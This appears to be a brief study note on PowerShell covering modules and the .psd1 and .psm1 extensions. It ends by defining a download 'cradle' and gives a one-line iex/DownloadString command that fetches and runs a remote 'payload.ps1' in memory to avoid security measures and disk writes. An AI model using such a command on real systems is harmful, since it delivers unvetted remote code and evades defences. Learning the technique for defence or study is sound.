# PowerShell
- PowerShell is commonly associated with Windows 7 and later versions of the Windows operating system.
- PowerShell is NOT powershell.exe. It is the *System.Management.Automation.dll*
- PowerShell that contains a collection of cmdlets, functions, variables, and other elements that can be reused across multiple scripts or sessions.
- PowerShell Modules are designed to encapsulate and organize specific pieces of functionality in a modular and efficient way.
- PowerShell Extenstion is .psd1 & .psm1
- ```.psd1```: This extension is used for PowerShell Data files. Specifically, it is commonly used for module manifest files. A module manifest is a metadata file that provides information about a PowerShell module, such as its name, version, author, and dependencies. The .psd1 file is written in a format similar to a hashtable with key-value pairs and is used to define various attributes and settings for the module.
- ```.psm1```: This extension is used for PowerShell Script Module files. These are script files that contain PowerShell code, including functions and cmdlets, that are part of a module. When you create a module, you can include one or more .psm1 files to define the actual functionality provided by the module. These script module files are typically where you write the code for the module's cmdlets and functions.
- what is mean of ```Cradle```?
It is a method used for executing PowerShell commands or scripts in a way that may bypass security measures and avoid writing scripts or payloads to disk.\
Example:\
```iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')```
>"iex" stands for "Invoke-Expression." It is a cmdlet that allows you to run a string as a PowerShell expression or script. The iex cmdlet takes a string as its argument and then interprets and executes the code contained within that string.
- 
